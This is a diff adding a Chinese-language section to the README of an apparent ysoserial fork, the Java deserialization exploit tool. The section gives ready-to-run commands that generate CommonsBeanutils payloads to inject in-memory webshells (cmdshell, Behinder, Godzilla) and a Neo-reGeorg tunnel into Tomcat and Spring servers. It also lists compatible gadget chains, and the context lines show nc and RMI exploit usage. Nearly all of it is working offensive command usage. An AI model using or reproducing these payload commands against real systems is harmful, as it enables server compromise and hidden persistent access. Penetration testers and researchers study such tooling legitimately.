@@ -138,6 +138,47 @@ $ nc 10.10.10.10 1099 < groovypayload.bin
 $ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
+## 内存马相关 thanks @Y4er
+
+以CommonsBeanutils192NOCC为例：
+
+```shell
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatCmdEcho"                     # TomcatCmdEcho
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatServletMemShellFromJMX"      # TomcatServletMemShellFromJMX
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatServletMemShellFromThread"   # TomcatServletMemShellFromThread
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatFilterMemShellFromJMX"       # TomcatFilterMemShellFromJMX     适用于tomcat7-9
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatFilterMemShellFromThread"    # TomcatFilterMemShellFromThread  适用于tomcat7-9
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFromJMX"     # TomcatListenerMemShellFromJMX
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFromThread"  # TomcatListenerMemShellFromThread
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerNeoRegFromThread"    # TomcatListenerNeoRegFromThread     python neoreg.py -k fuckyou
+java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:SpringInterceptorMemShell"         # SpringInterceptorMemShell       链接shell需要使用存在的路由
+java -jar ysoserial.jar CommonsBeanutils192NOCC "FILE:E:\Calc.class"                      # ClassLoaderTemplate
+java -jar ysoserial.jar CommonsBeanutils192NOCC "calc"                                    # CommandTemplate                 CLASS: FILE: 不使用协议开头则默认为执行cmd
+```
+
+一键注入cmdshell、冰蝎、哥斯拉内存马，shell连接使用请查看指定类。解决了request和response包装类导致冰蝎链接失败的问题，[见issue](https://github.com/rebeyond/Behinder/issues/187)。
+
+以下受到`Gadgets.createTemplatesImpl`影响的gadget均需要如上方式传递参数：
+
+1. Click1
+2. CommonsBeanutils1
+3. CommonsBeanutils183NOCC
+4. CommonsBeanutils192NOCC
+5. CommonsCollections2
+6. CommonsCollections3
+7. CommonsCollections4
+8. Hibernate1
+9. JavassistWeld1
+10. JBossInterceptors1
+11. Jdk7u21
+12. JSON1
+13. MozillaRhino1
+14. MozillaRhino2
+15. ROME
+16. Spring1
+17. Spring2
+18. Vaadin1
+
 ## Installation
 
 [![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
